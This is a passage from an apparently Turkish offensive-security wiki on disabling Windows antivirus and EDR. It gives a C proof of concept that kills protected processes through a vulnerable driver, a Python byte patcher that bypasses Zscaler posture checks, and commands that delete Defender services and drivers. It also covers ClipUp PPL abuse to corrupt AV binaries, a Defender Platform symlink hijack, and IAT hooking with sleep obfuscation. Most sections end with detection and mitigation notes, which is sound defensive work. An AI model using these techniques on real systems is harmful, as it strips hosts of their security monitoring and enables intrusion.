   sc start  ServiceMouse
   ```
   İlk satır sürücüyü **kernel service** olarak kaydeder, ikinci satır ise sürücüyü başlatarak `\\.\ServiceMouse`'un user land'den erişilebilir olmasını sağlar.
3. **Sürücünün sunduğu IOCTL'ler**
   | IOCTL code | Yetenek                                 |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID ile herhangi bir process'i sonlandırma (Defender/EDR servislerini kapatmak için kullanılır) |
   | `0x990000D0` | Diskteki herhangi bir dosyayı silme |
   | `0x990001D0` | Sürücüyü unload etme ve servisi kaldırma |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Neden işe yarar**: BYOVD, user-mode korumalarını tamamen atlar; kernel'de çalışan kod, PPL/PP, ELAM veya diğer güçlendirme özelliklerinden bağımsız olarak *korunan* süreçleri açabilir, sonlandırabilir ya da kernel nesnelerine müdahale edebilir.

Tespit / Azaltma
• Windows'un `AToolsKrnl64.sys` dosyasını yüklemeyi reddetmesi için Microsoft'un güvenlik açığı bulunan sürücüleri engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirin.
• Yeni *kernel* hizmetlerinin oluşturulmasını izleyin ve bir sürücü herkesin yazabildiği bir dizinden yüklenirse veya izin listesinde yoksa uyarı verin.
• Özel aygıt nesnelerine açılan user-mode handle'ları ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Diskteki İkili Dosyaları Yamayarak Zscaler Client Connector Posture Kontrollerini Atlatma

Zscaler **Client Connector**, cihaz posture kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye güvenir. İki zayıf tasarım tercihi tam bir atlatmayı mümkün kılar:

1. Posture değerlendirmesi **tamamen istemci tarafında** gerçekleşir (sunucuya bir boolean gönderilir).
2. Dahili RPC uç noktaları yalnızca bağlanan çalıştırılabilir dosyanın **Zscaler tarafından imzalandığını** doğrular (`WinVerifyTrust` aracılığıyla).<sup>[[11]](#references)</sup>

**Diskteki dört imzalı ikili dosya yamalanarak** her iki mekanizma da etkisiz hâle getirilebilir:

| İkili dosya | Yamalanan özgün mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her kontrol uyumlu sayılır |
| `ZSAService.exe` | `WinVerifyTrust` için dolaylı çağrı | NOP-ed ⇒ her süreç (imzasız olanlar bile) RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tünel üzerindeki bütünlük kontrolleri | Kısa devre edilir |

Asgari patcher örneği:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

After orijinal dosyaları değiştirdikten ve hizmet yığınını yeniden başlattıktan sonra:

* **Tüm** güvenlik duruşu kontrolleri **yeşil/uyumlu** görünür.
* İmzasız veya değiştirilmiş ikili dosyalar, adlandırılmış pipe RPC uç noktalarını (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`) açabilir.
* Ele geçirilmiş ana bilgisayar, Zscaler ilkeleriyle tanımlanan iç ağa sınırsız erişim elde eder.

Bu vaka çalışması, yalnızca istemci tarafında verilen güven kararlarının ve basit imza kontrollerinin birkaç baytlık yamayla nasıl aşılabileceğini gösteriyor.

## Microsoft Defender `BTR.sys` güvenilir işlevselliğinin kötüye kullanılması

Defender'ın **Boot-Time Removal** sürücüsü, klasik BYOVD'ye yararlı bir karşı örnektir. `BTR.sys`, bellek bozulması hatası ve IOCTL arayüzü olmayan, Microsoft tarafından imzalanmış meşru bir iyileştirme bileşenidir; yönetici erişimi ve `SeLoadDriverPrivilege` elde edildikten sonra operatör bunun yerine sürücünün özel iyileştirme işlemini taklit ederek amaçlanan Ring-0 dosya/kayıt defteri işlemlerini gerçekleştirebilir. Bu, **ilk erişim veya ayrıcalık yükseltme değil, ele geçirilme sonrası AV/EDR etkisizleştirme ilkelidir** ve sürücü, dikkat çeken üçüncü taraf bir sürücü getirmek yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` kaynağından çıkarılabilir.<sup>[[36]](#references)</sup>

### Tek seferlik sürücüyü hazırlama

Defender normalde kaynağı rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer şekilde adlandırılmış bir kernel hizmeti kaydeder. `DriverEntry`, hizmetin `Args` değerini okur, başvurulan NTFS ADS'yi açar, eylem listesinin şifresini çözüp doğrular, geri bildirim yazar ve başarılı yürütmenin ardından sürücü bellekte kalmak yerine boşaltılsın diye `0xC0000056` (`STATUS_DELETE_PENDING`) döndürür. Taklit edilmiş bir hizmet aşağıdaki karakteristik değerlere sahiptir.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` akışı, RC4 ile şifrelenmiş bir blob içerir. Analiz edilen derlemelerde sabit 256 baytlık bir anahtar yeniden kullanılır; dolayısıyla şifreleme, yetkilendirme sınırı değildir. Geçerli bir düz metin; 24 baytlık bir genel başlık (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, başlık CRC'si ve payload'dan türetilen bir işlem kimliği), ardından null ile sonlandırılmış bir UTF-16 geri bildirim yolu ve istenen sayıda öğe içerir. Her öğe, 16 baytlık bir başlık (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) ve tam olarak **dört NUL baytıyla** biten, eyleme özgü verilerden oluşur. Her başlık/veri bölgesi, CRC-32 polinomu `0xEDB88320`, başlangıç durumu `0xFFFFFFFF` ve **son XOR olmadan** (`~CRC32`) ayrı ayrı doğrulanır; her bölge için CRC durumu sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen eylem kimlikleri şu kernel ilkellerini kullanıma açar.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Öğe verisi | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Kilitli bir dosya da dahil olmak üzere dosyayı siler |
| 2 | `[UTF-16 path]` | Boş bir dizini kaldırır |
| 3 | `[Flags][source][destination]` | Dosyayı saldırganın seçtiği korumalı bir yola taşır; boş bir hedef, silme anlamına gelir |
| 4 | `[Flags][key path]` | Bir registry anahtarını özyinelemeli olarak siler |
| 5 | `[Flags][key path + "\\" + value]` | Bir registry değerini siler |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Bir registry değeri oluşturur/günceller ve eksik anahtar yollarını oluşturur |

5 ve 6 numaralı eylemlerde, kablodaki anahtar/değer ayırıcısı **art arda iki ters eğik çizgidir**; geleneksel biçimde yazılmış bir yol doğru şekilde ayrıştırılmaz. Geri bildirim dosyası büyük ölçüde isteği yansıtır, ancak her öğenin ilk dört veri baytı, öğenin sonuç `NTSTATUS` değerine dönüşür. Baştaki flags alanı olmayan 1 ve 2 numaralı eylemlerde BTR, bu duruma yer açmak için yolu dört ayrılmış son bayta kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` iş akışı ve erken önyükleme aralığı

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) zincirin tamamını uygular: `BTR.sys` dosyasını yerel Defender'dan çıkarır, `<random>.sys:changelist` ve bir geri bildirim akışı oluşturur, zincirlenmiş eylemleri serileştirir/kontrol toplamlarını hesaplar/şifreler, hizmet registry anahtarını doğrudan oluşturur ve ardından `-trigger now` için `NtLoadDriver` çağrısı yapar ya da `-trigger boot` için bunu sistem başlangıcında çalışan bir sürücü olarak bırakır. Registry'nin doğrudan hazırlanması, normal SCM `CreateServiceW` yolunu atlar ve bu nedenle hizmet yükleme Event ID 7045 olayını **üretmez**. Önyükleme tetiklemeli bileşenler daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` kullanılamaz; çünkü BTR, depolama yığını ve `SystemRoot` bağlantısı hazır olmadan `DriverEntry` içinden dosya I/O işlemleri gerçekleştirir. `Start=1` ve yüksek öncelikli `Boot Bus Extender` grubu ise Phase 1'de çalışır: NTFS kullanılabilir durumdadır, ancak sistem başlangıcında çalışan birçok güvenlik sürücüsü ve kullanıcı modu EDR hizmeti henüz başlatılmamıştır. `WdFilter` gibi önyükleme başlangıç filtreleri zaten yüklenmiş olabilir; ancak BTR, sonraki başlatma öncesinde bunların ikili dosyalarını veya hizmet yapılandırmalarını kaldırabilir ve SCM bunları başlatmadan önce hizmet yürütülebilir dosyalarını silebilir. ELAM bu açığı kapatmaz; çünkü BTR, önyükleme başlangıç değerlendirmesinden sonra çalışır ve geçerli bir Microsoft imzasına sahiptir.<sup>[[36]](#references)</sup>

Birden fazla eylem tek bir işlemde yürütülür. PoC, sabit kodlanmış `\SystemRoot\Temp\BootClean.log` için Action 1'i en başa ekler: BTR bu günlüğü oluşturur, ardından kendi silme isteğini işler ve yükü kaldırmadan önce dosyayı siler. Bu, izleri azaltırken geri bildirimin `<random>.sys:<random>.dat` içine yerleştirilmesi sürücünün ve her iki stream'in birlikte kaldırılmasına olanak tanır.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli tespit korelasyonları

Yalnızca imzaya dayalı kurallar ve Microsoft'un güvenlik açığı bulunan sürücü engelleme listesi, BTR'nin amaçlanan işlevinin kötüye kullanılmasını önlemez. Meşru Defender kökenini gelişigüzel bir başlatıcıdan ayırt ederken bu davranış korelasyonlarını tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR hazırlığı için evrensel bir göstergedir. Aynı `.sys` dosyasına eklenmiş bir `.dat` ADS özellikle şüphelidir; çünkü meşru Defender geri bildirimi normalde `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altına yerleştirir.
- **System 7045 olmadan Sysmon 12/13:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` yolunun doğrudan oluşturulmasını, eşleşen bir SCM yükleme olayı olmadığında ilişkilendirin.
- **Sysmon 6 -> 23:** Defender dışı bilinen bir kökenden gelen BTR sürücüsü yüklemesini, özellikle güvenlik ikili dosyalarında, ardından `System`/PID 4'e atfedilen dosya silme işlemiyle ilişkilendirin.
- **Sysmon 11 -> 23:** `System`/PID 4 tarafından `\SystemRoot\Temp\BootClean.log` dosyasının hızla oluşturulup silinmesi için uyarı verin.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve denetleyin; bir Microsoft imzası, bir güvenlik aracı sürücüsü `cmd.exe`, PowerShell veya bilinmeyen bir süreç tarafından hazırlandığında tek başına yeterli güvence değildir.

## LOLBIN'lerle AV/EDR'yi Kurcalamak İçin Protected Process Light (PPL) Kötüye Kullanımı

Protected Process Light (PPL), yalnızca eşit veya daha yüksek koruma düzeyindeki süreçlerin birbirlerini kurcalayabilmesini sağlayan bir imza/düzey hiyerarşisi uygular. Saldırgan bakış açısından, PPL etkin bir ikili dosyayı meşru şekilde başlatabiliyor ve argümanlarını denetleyebiliyorsanız, günlükleme gibi zararsız işlevleri AV/EDR tarafından kullanılan korumalı dizinlere karşı kısıtlı, PPL destekli bir yazma ilkel işlemine dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir sürecin PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen tüm DLL'ler) PPL uyumlu bir EKU ile imzalanmış olmalıdır.
- Süreç, `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` bayraklarıyla CreateProcess kullanılarak oluşturulmalıdır.
- İkili dosyanın imzalayanıyla eşleşen uyumlu bir koruma düzeyi istenmelidir (ör. kötü amaçlı yazılımdan koruma imzalayanları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayanları için `PROTECTION_LEVEL_WINDOWS`). Yanlış düzeyler oluşturma işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS korumasına daha kapsamlı bir giriş için ayrıca bkz.:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Başlatıcı araçları
- Açık kaynaklı yardımcı araç: CreateProcessAsPPL (koruma düzeyini seçer ve argümanları hedef EXE'ye iletir):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım örüntüsü:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- İmzalı sistem binary’si `C:\Windows\System32\ClipUp.exe` kendi alt sürecini başlatır ve çağıranın belirttiği bir konuma log dosyası yazmak için bir parametre kabul eder.
- PPL process olarak başlatıldığında dosya yazma işlemi PPL koruması altında gerçekleşir.
- ClipUp, boşluk içeren yolları ayrıştıramaz; normalde korunan konumları belirtmek için 8.3 kısa yollarını kullanın.

8.3 kısa yol yardımcıları
- Kısa adları listeleyin: Her üst dizinde `dir /x` çalıştırın.
- cmd’de kısa yolu türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Kötüye kullanım zinciri (soyut)
1) PPL destekli LOLBIN’i (ClipUp) bir launcher (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Korunan bir AV dizininde (ör. Defender Platform) dosya oluşturulmasını zorlamak için ClipUp log-yolu argümanını verin. Gerekirse 8.3 kısa adlarını kullanın.
3) Hedef binary çalışırken AV tarafından normalde açık/kilitli tutuluyorsa (ör. MsMpEng.exe), AV başlamadan önce, açılışta güvenilir biçimde daha erken çalışan bir otomatik başlatma hizmeti yükleyerek yazma işlemini planlayın. Process Monitor ile açılış sırasını doğrulayın (boot logging).
4) Yeniden başlatıldığında PPL korumalı yazma işlemi, AV binary’lerini kilitlemeden önce gerçekleşir; böylece hedef dosya bozulur ve AV’nin başlaması engellenir.

Örnek çalıştırma (güvenlik amacıyla yollar gizlenmiş/kısaltılmıştır):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içeriği yerleşim dışında kontrol edemezsiniz; bu primitive, hassas içerik enjeksiyonundan ziyade bozulmaya uygundur.
- Bir hizmeti yüklemek/başlatmak ve yeniden başlatma penceresi için yerel yönetici/SYSTEM yetkisi gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; önyükleme sırasında çalıştırma, dosya kilitlerini önler.

Tespitler
- Özellikle standart dışı başlatıcılar tarafından üst süreç olarak başlatıldığında ve önyükleme sırasında, olağan dışı argümanlarla çalışan `ClipUp.exe` süreçlerinin oluşturulması.
- Şüpheli ikilileri otomatik başlatacak şekilde yapılandırılmış ve sürekli olarak Defender/AV'den önce başlatılan yeni hizmetler. Defender başlangıç hatalarından önceki hizmet oluşturma/değiştirme işlemlerini inceleyin.
- Defender ikilileri/Platform dizinleri için dosya bütünlüğü izleme; korumalı süreç işaretlerine sahip süreçlerin beklenmedik dosya oluşturma/değiştirme işlemleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV dışı ikililerin anormal PPL seviyesi kullanımını araştırın.

Azaltma önlemleri
- WDAC/Code Integrity: PPL olarak hangi imzalı ikililerin, hangi üst süreçler altında çalışabileceğini kısıtlayın; ClipUp'ın meşru bağlamların dışında çalışmasını engelleyin.
- Hizmet güvenliği: otomatik başlatılan hizmetlerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası üzerinde oynanmasını izleyin.
- Defender kurcalama korumasının ve erken başlatma korumalarının etkin olduğundan emin olun; ikili dosya bozulmasına işaret eden başlangıç hatalarını inceleyin.
- Ortamınızla uyumluysa güvenlik araçlarının bulunduğu birimlerde 8.3 kısa ad oluşturmayı devre dışı bırakmayı değerlendirin (iyice test edin).

## Platform Sürüm Klasörü Symlink Hijack ile Microsoft Defender'a Müdahale

Windows Defender, çalışacağı platformu şu konumun altındaki alt klasörleri numaralandırarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Sözlüksel olarak en yüksek sürüm dizesine sahip alt klasörü (ör. `4.18.25070.5-0`) seçer ve ardından Defender hizmet süreçlerini buradan başlatır (hizmet/kayıt defteri yollarını buna göre günceller). Bu seçim, dizin symlink'leri dahil olmak üzere dizin girdilerine güvenir. Bir yönetici, Defender'ı saldırganın yazabildiği bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi sağlamak için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Ön koşullar
- Yerel Administrator (Platform klasörü altında dizin/symlink oluşturmak için gerekir)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme olanağı (önyüklemede hizmetin yeniden başlatılması)
- Yalnızca yerleşik araçlar gerekir (`mklink`)

Neden işe yarar
- Defender kendi klasörlerine yazmayı engeller, ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan sözlüksel olarak en yüksek sürümü seçer.

Adım adım (örnek)
1) Mevcut platform klasörünün yazılabilir bir kopyasını hazırlayın; ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe'nin (WinDefend) yönlendirilmiş yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` altındaki yeni process path’ini ve bu konumu gösteren service configuration/registry değerlerini görmeniz gerekir.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender’ın process’lerinde kod çalıştırmak için Defender’ın application directory’sinden yüklediği DLL’leri bırakın/değiştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Sürüm symlink’ini kaldırın; böylece bir sonraki başlatmada yapılandırılmış path çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Bu tekniğin tek başına ayrıcalık yükseltme sağlamadığını unutmayın; yönetici hakları gerektirir.

## PIC ile API/IAT Hooking + Call-Stack Spoofing (Crystal Kit tarzı)

Red team'ler, runtime evasion'ı C2 implant'ından çıkarıp Import Address Table'ını (IAT) hook'layarak ve seçili API'leri saldırganın kontrolündeki position-independent code'a (PIC) yönlendirerek doğrudan hedef modüle taşıyabilir. Bu yöntem, evasion'ı birçok kitin sunduğu sınırlı API yüzeyinin (ör. CreateProcessA) ötesine geneller ve aynı korumaları BOF'lere ve post-exploitation DLL'lerine de uygular.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Üst düzey yaklaşım
- Reflective loader kullanarak hedef modülün yanına bir PIC blob yerleştirin (önek olarak veya eşlik eden dosya şeklinde). PIC kendi kendine yeterli ve position-independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR üzerinde ilerleyin ve hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girdilerini ince PIC wrapper'larına yönlendirin.
- Her PIC wrapper, gerçek API adresine tail-call yapmadan önce evasion işlemlerini gerçekleştirir. Tipik evasion işlemleri şunlardır:
  - Çağrı öncesinde bellek maskeleme/maske kaldırma (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa adlarını/izinlerini değiştirme) ve çağrıdan sonra geri yükleme.
  - Call-stack spoofing: iyi huylu görünen bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinin beklenen frame'leri çözümlemesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için Aggressor script'in (veya eşdeğerinin) Beacon, BOF'ler ve post-ex DLL'ler için hangi API'lerin hook'lanacağını kaydedebilmesi amacıyla bir arayüz dışa aktarın.

Burada IAT hooking kullanmanın nedenleri
- Hook'lanan import'u kullanan tüm kodlarda çalışır; araç kodunu değiştirmeyi veya belirli API'leri proxy'lemek için Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'lerini kapsar: LoadLibrary*'ı hook'lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanızı ve bu modüllerin API çağrılarına aynı maskeleme/stack evasion işlemlerini uygulamanızı sağlar.
- CreateProcessA/W'yi wrapper'layarak call-stack tabanlı tespitlere karşı process-spawning post-ex komutlarının güvenilir biçimde kullanılmasını sağlar.

Minimal IAT hook taslağı (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yamayı relocations/ASLR sonrasında ve import ilk kez kullanılmadan önce uygulayın. TitanLdr/AceLdr gibi reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking yapıldığını gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi yamadan önce yakaladığınız özgün IAT değerini veya LdrGetProcedureAddress'i kullanarak çözümleyin.
- PIC için RW → RX geçişleri kullanın ve yazılabilir+çalıştırılabilir sayfalar bırakmaktan kaçının.

Call-stack spoofing stub
- Draugr tarzı PIC stub'ları sahte bir çağrı zinciri (benign modüllerdeki return address'ler) oluşturur, ardından gerçek API'ye geçiş yapar.
- Bu, Beacon/BOF'ların hassas API'lere yönelik kanonik stack'ler bekleyen tespitleri atlatır.
- API prologue'undan önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- DLL yüklendiğinde PIC ve hook'ların otomatik başlatılması için reflective loader'ı post-ex DLL'lerin başına ekleyin.
- Beacon ve BOF'ların kod değişikliği olmadan aynı evasion yolundan şeffaf biçimde yararlanması için hedef API'leri kaydeden bir Aggressor script kullanın.

Tespit/DFIR değerlendirmeleri
- IAT bütünlüğü: image dışı (heap/anon) adreslere çözümlenen girdiler; import pointer'larının düzenli olarak doğrulanması.
- Stack anomalileri: yüklü image'lere ait olmayan return address'ler; image dışı PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetrisi: IAT'ye süreç içinden yazma; import thunk'larını değiştiren erken DllMain etkinliği; yükleme sırasında oluşturulan beklenmedik RX bölgeleri.
- Image-load evasion: LoadLibrary* hooking yapılıyorsa, bellek maskeleme olaylarıyla ilişkili şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT patching yapan reflective loader'lar (örn. TitanLdr, AceLdr)
- Memory masking hook'ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO aracılığıyla import-time IAT hook'ları

Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden özel bir resolver ile değiştirerek `ProcessImports()` **sırasında** import'ları hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC kendini serbest bıraktıktan sonra da yaşamaya devam eden bir **resident PICO** (kalıcı PIC nesnesi) oluşturun.
- Loader'ın import resolver'ını üzerine yazan bir `setup_hooks()` fonksiyonu dışa aktarın (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'ları atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı bir hook araması kullanın. Hook varsa onu döndürün; yoksa gerçek `GetProcAddress`'e devredin.
- Hook hedeflerini link zamanında Crystal Palace `addhook "MODULE$Func" "hook"` girdileriyle kaydedin. Hook, resident PICO içinde yaşadığı için geçerliliğini korur.

Bu, yüklenen DLL'in code section'ını yükleme sonrası patch'lemeden **import-time IAT yönlendirmesi** sağlar.

### Hedef PEB-walking kullanıyorsa hook'lanabilir import'ları zorlamak

Import-time hook'lar yalnızca fonksiyon hedefin IAT'sinde gerçekten bulunuyorsa devreye girer. Bir modül API'leri PEB-walk + hash ile çözümlüyorsa (import girdisi yoksa), gerçek bir import ekleyerek loader'ın `ProcessImports()` yolunun bunu görmesini sağlayın:

- Hash'lenmiş export çözümlemesini (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Derleyici bir IAT girdisi üretir ve reflective loader import'ları çözümlerken araya girilmesini sağlar.

### `Sleep()` patch'lemeden Ekko tarzı sleep/idle obfuscation

`Sleep`'i patch'lemek yerine, implantın kullandığı **gerçek wait/IPC primitive'lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook'layın. Uzun beklemelerde, boşta kalınan sırada bellekteki image'i şifreleyen Ekko tarzı bir obfuscation zinciri içinde çağrıyı sarmalayın:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue`'u hazırlanmış `CONTEXT` frame'leriyle çağıran bir callback dizisi zamanlamak için `CreateTimerQueueTimer` kullanın.
- Tipik zincir (x64): image'i `PAGE_READWRITE` olarak ayarlayın → eşlenmiş image'in tamamında `advapi32!SystemFunction032` aracılığıyla RC4 ile şifreleyin → bloklayan beklemeyi gerçekleştirin → RC4 ile şifreyi çözün → PE section'larını dolaşarak **section başına izinleri geri yükleyin** → tamamlandığını bildirin.
- `RtlCaptureContext` bir `CONTEXT` şablonu sağlar; bunu birden fazla frame'e kopyalayın ve her adımı çağırmak için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: Image maskelenmiş durumdayken çağıranın devam etmesi için uzun beklemelerde (örn. `WAIT_OBJECT_0`) “success” döndürün. Bu yöntem, boşta kalınan aralıklarda modülü scanner'lardan gizler ve klasik “patched `Sleep()`” imzasını önler.

Tespit fikirleri (telemetri tabanlı)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback'lerinin kısa süre içinde art arda görülmesi.
- Büyük ve bitişik, image boyutundaki buffer'larda `advapi32!SystemFunction032` kullanılması.
- Büyük aralıklı `VirtualProtect` çağrısının ardından özel section başına izinlerin geri yüklenmesi.

### Sleep-obfuscation gadget'ları için runtime CFG kaydı

CFG etkin hedeflerde, `jmp [rbx]` veya `jmp rdi` gibi mid-function gadget'a yapılan ilk indirect jump genellikle `STATUS_STACK_BUFFER_OVERRUN` ile süreci çökertir; çünkü gadget modülün CFG metadata'sında yer almaz. Ekko/Kraken tarzı zincirlerin güçlendirilmiş süreçlerde çalışmaya devam etmesi için:<sup>[[30]](#references)</sup>

- Zincirin kullandığı her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` girdileriyle kaydedin.
- Yüklü image'lerdeki (`ntdll`, `kernel32`, `advapi32`) adresler için `MEMORY_RANGE_ENTRY`, **image base**'ten başlamalı ve **image'in tamamını** kapsamalıdır.
- Elle eşlenmiş/PIC/stomped bölgeler için bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget'ını değil, indirect olarak ulaşılan export'ları (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect target olacak saldırgan denetimindeki çalıştırılabilir section'ları da işaretleyin.

Böylece ROP/JOP tarzı sleep zincirleri, “yalnızca CFG olmayan süreçlerde çalışır” durumundan `/guard:cf` ile derlenmiş `explorer.exe`, browser'lar, `svchost.exe` ve diğer endpoint'lerde yeniden kullanılabilir bir primitive'e dönüşür.

